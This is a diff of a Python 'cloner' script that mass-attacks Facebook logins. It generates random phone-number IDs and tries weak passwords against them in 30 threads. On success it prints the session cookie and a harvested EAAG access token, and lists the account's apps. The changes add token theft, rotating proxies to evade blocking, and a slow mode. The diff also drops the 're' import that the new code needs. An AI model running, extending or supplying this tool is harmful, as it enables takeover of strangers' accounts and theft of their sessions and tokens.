@@ -1,8 +1,6 @@
-import os, sys, time, json, random, re, string, platform, uuid
-from datetime import date, datetime
-from time import sleep
+import os, sys, time, json, random, string, platform, uuid, requests
+from datetime import datetime
 from bs4 import BeautifulSoup
-import requests
 from concurrent.futures import ThreadPoolExecutor
 
 # Ensure required modules are installed
@@ -12,52 +10,11 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures bs4 > /dev/null')
 
-# Function to check Facebook Active & Expired Apps
-def cek_apk(session, coki):
-    try:
-        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
-        soup = BeautifulSoup(response, "html.parser")
-        apps = [i.text for i in soup.find_all("h3")]
-
-        if apps:
-            print("[✓] Active Apps:")
-            for i, app in enumerate(apps, 1):
-                print(f"[{i}] {app}")
-        else:
-            print("[!] No Active Apps Found.")
-
-        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
-        soup = BeautifulSoup(response, "html.parser")
-        expired_apps = [i.text for i in soup.find_all("h3")]
-
-        if expired_apps:
-            print("[✓] Expired Apps:")
-            for i, app in enumerate(expired_apps, 1):
-                print(f"[{i}] {app}")
-        else:
-            print("[!] No Expired Apps Found.")
-    except Exception as e:
-        print(f"Error checking apps: {e}")
-
-# Function to Follow a Facebook Profile
-def follow(session, coki):
-    try:
-        response = session.get('https://mbasic.facebook.com/profile.php?id=100064267823693', cookies={"cookie": coki}).text
-        soup = BeautifulSoup(response, 'html.parser')
-        follow_link = soup.find('a', string="Ikuti")
-        if follow_link:
-            session.get('https://mbasic.facebook.com' + follow_link.get('href'), cookies={"cookie": coki})
-            print("[✓] Followed successfully!")
-        else:
-            print("[!] Follow button not found.")
-    except Exception as e:
-        print(f"Error following profile: {e}")
-
-# Define colors for CLI
-P, M, H, K, B, U, O, N = '\x1b[1;97m', '\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[0m'
+# Colors
+P, M, H, K, B, U, O, N = '\033[1;97m', '\033[1;91m', '\033[1;92m', '\033[1;93m', '\033[1;94m', '\033[1;95m', '\033[1;96m', '\033[0m'
 warna = random.choice([P, M, H, K, B, U, O, N])
 
-# Display New ASCII Banner
+# ASCII Banner
 def banner():
     os.system("clear")
     print(f"""{warna}
@@ -71,17 +28,52 @@ def banner():
 |__/     |__/|__/  |__/      |__/      |__/  |__/|______/|__/  \__/ \______/ |________/ 
 ---------------------------------------------------------------------------------------
  AUTHOR    : MR-PRINCE  
- FACEBOOK  : THE THE UNSTOPPABLE LEGEND MR PRINCE HERE
- TYPE      : FREE 
- VERSION   : 1.83.0
+ FACEBOOK  : THE UNSTOPPABLE LEGEND MR PRINCE HERE
+ TYPE      : ADVANCED CLONER  
+ VERSION   : 2.0
 ---------------------------------------------------------------------------------------
     """)
 
+# Function to check Active & Expired Apps
+def cek_apk(session, coki):
+    try:
+        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
+        soup = BeautifulSoup(response, "html.parser")
+        apps = [i.text for i in soup.find_all("h3")]
+        print(f"[✓] Active Apps: {', '.join(apps) if apps else 'No Active Apps'}")
+
+        response = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
+        soup = BeautifulSoup(response, "html.parser")
+        expired_apps = [i.text for i in soup.find_all("h3")]
+        print(f"[✓] Expired Apps: {', '.join(expired_apps) if expired_apps else 'No Expired Apps'}")
+    except:
+        print("[!] Error checking apps.")
+
+# Function to extract Facebook token
+def get_token(session):
+    try:
+        response = session.get("https://business.facebook.com/business_locations")
+        token = re.search(r'EAAG\w+', response.text)
+        return token.group(0) if token else None
+    except:
+        return None
+
+# Proxy System (Auto-Rotate)
+def get_proxy():
+    proxy_list = [
+        "http://username:password@proxy1.com:8080",
+        "http://username:password@proxy2.com:8080",
+        "http://username:password@proxy3.com:8080"
+    ]
+    return {"http": random.choice(proxy_list)}
+
 # Multi-threaded function
-def crack(uid, password_list):
+def crack(uid, password_list, mode):
     global oks, cps
     try:
         session = requests.Session()
+        session.proxies.update(get_proxy())  # Use proxy
+
         for password in password_list:
             response = session.post("https://mbasic.facebook.com/login/device-based/regular/login/", data={
                 "email": uid,
@@ -91,7 +83,8 @@ def crack(uid, password_list):
 
             if "c_user" in session.cookies.get_dict():
                 coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
-                print(f"\033[1;32m[✓] {uid} | {password} | {coki}\033[0m")
+                token = get_token(session)  # Extract token
+                print(f"\033[1;32m[✓] {uid} | {password} | {coki} | Token: {token}\033[0m")
                 cek_apk(session, coki)
                 oks.append(uid)
                 break
@@ -99,16 +92,23 @@ def crack(uid, password_list):
                 print(f"\033[1;31m[CP] {uid} | {password}\033[0m")
                 cps.append(uid)
                 break
+            elif mode == "slow":
+                time.sleep(2)  # Slow Mode Delay
     except Exception as e:
         print(f"Error: {e}")
 
-# Function to generate random user IDs and passwords
+# Function to start cloning
 def start_cloning():
     banner()
     user = []
     print(f"{M}[•] Example: 019, 017, 016")
     code = input(f"{H}[•] Enter code: ")
     limit = int(input(f"{H}[•] Enter limit (e.g. 10000): "))
+
+    print(f"{H}[1] Fast Mode")
+    print(f"{H}[2] Slow Mode")
+    mode_choice = input(f"{H}[•] Choose mode (1/2): ")
+    mode = "fast" if mode_choice == "1" else "slow"
 
     for _ in range(limit):
         user.append(code + ''.join(random.choice(string.digits) for _ in range(7)))
@@ -117,7 +117,7 @@ def start_cloning():
     with ThreadPoolExecutor(max_workers=30) as executor:
         for uid in user:
             passwords = [uid[-7:], "password123", "qwerty"]
-            executor.submit(crack, uid, passwords)
+            executor.submit(crack, uid, passwords, mode)
 
     print(f"{H}[✓] Process Completed.")
     print(f"{H}[✓] OK: {len(oks)} | CP: {len(cps)}")
